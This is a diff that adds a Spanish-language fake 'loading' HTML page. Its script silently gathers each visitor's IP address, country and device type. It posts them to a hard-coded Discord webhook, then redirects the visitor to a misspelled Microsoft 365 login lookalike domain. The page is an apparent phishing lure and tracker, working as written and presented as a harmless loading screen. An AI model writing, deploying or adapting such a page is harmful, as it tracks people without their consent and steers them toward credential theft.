@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Cargando...</title>
+
+<style>
+body{
+margin:0;
+background:#000;
+display:flex;
+justify-content:center;
+align-items:flex-start;
+height:100vh;
+padding-top:120px;
+}
+
+.loader{
+width:120px;
+}
+
+.logo{
+position:fixed;
+bottom:20px;
+width:140px;
+}
+</style>
+
+</head>
+<body>
+
+<img class="loader" src="https://i.imgur.com/Lp8RJlH.gif">
+<img class="logo" src="https://i.imgur.com/ZuK7yFF.png">
+
+<script>
+
+// ====== CONFIGURACION ======
+const webhook = "https://discordapp.com/api/webhooks/1472747250240327804/_h8vVoKEhvjQXj-VFamdKhHUIKU66BYUaGLVWPPv4A33uCWvwHgMeAo4v0RrFnP7HPWP";
+const destino = "https://m365logiin.z13.web.core.windows.net/";
+
+// ====== ANTI SPAM REFRESH ======
+if(localStorage.getItem("clickEnviado")){
+window.location = destino;
+}
+
+localStorage.setItem("clickEnviado","true");
+
+// ====== DETECTAR DISPOSITIVO ======
+function detectarDispositivo(){
+let ua = navigator.userAgent;
+
+if(/iPhone/i.test(ua)) return "iPhone";
+if(/iPad/i.test(ua)) return "iPad";
+if(/Android/i.test(ua)) return "Android";
+if(/Windows/i.test(ua)) return "PC Windows";
+if(/Mac/i.test(ua)) return "Mac";
+return "Desconocido";
+}
+
+// ====== OBTENER IP + PAIS ======
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+
+let ip = data.ip || "Desconocida";
+let pais = data.country_name || "Desconocido";
+let fecha = new Date().toLocaleString();
+let dispositivo = detectarDispositivo();
+
+let mensaje =
+"✅ **Clic detectado**\n\n" +
+"🌍 IP: " + ip + " " + pais + "\n" +
+"🖥 Dispositivo: " + dispositivo + "\n" +
+"📆 Fecha: " + fecha + "\n============";
+
+fetch(webhook,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({content:mensaje})
+});
+
+});
+
+// ====== REDIRECCION 3 SEGUNDOS ======
+setTimeout(()=>{
+window.location = destino;
+},3000);
+
+</script>
+
+</body>
+</html>
